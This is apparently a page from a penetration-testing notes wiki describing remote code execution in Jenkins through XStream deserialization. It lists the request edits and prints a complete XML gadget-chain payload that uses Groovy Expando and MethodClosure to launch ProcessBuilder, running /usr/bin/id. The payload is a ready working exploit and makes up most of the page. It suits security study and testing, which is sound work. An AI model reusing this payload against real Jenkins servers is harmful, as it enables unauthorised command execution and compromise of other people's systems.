# Xstream Jenkins

## Groovy - Xstream Jenkins

In this example, jenkins \(v1.64\) is using third party libraries that include Gadget.

When creating a new items, it is possible to inject a Groovy payload which can lead to RCE.

#### Original request

![](../../../../.gitbook/assets/image%20%28150%29.png)

#### Edit the request

* change the name
* change content type to text/xml
* inject the payload

#### payload

```csharp
<map>
  <entry>
    <groovy.util.Expando>
      <expandoProperties>
        <entry>
          <string>hashCode</string>
          <org.codehaus.groovy.runtime.MethodClosure>
            <delegate class="groovy.util.Expando"/>
            <owner class="java.lang.ProcessBuilder">
              <command>
                <string>/usr/bin/id</string>
              </command>
            </owner>
            <method>start</method>
          </org.codehaus.groovy.runtime.MethodClosure>
        </entry>
      </expandoProperties>
    </groovy.util.Expando>
    <int>1</int>
  </entry>
</map>
```

Modified request

![](../../../../.gitbook/assets/image%20%28314%29.png)

Response

![](../../../../.gitbook/assets/image%20%28276%29.png)

### Resource

{% embed url="https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-2-xstream" %}





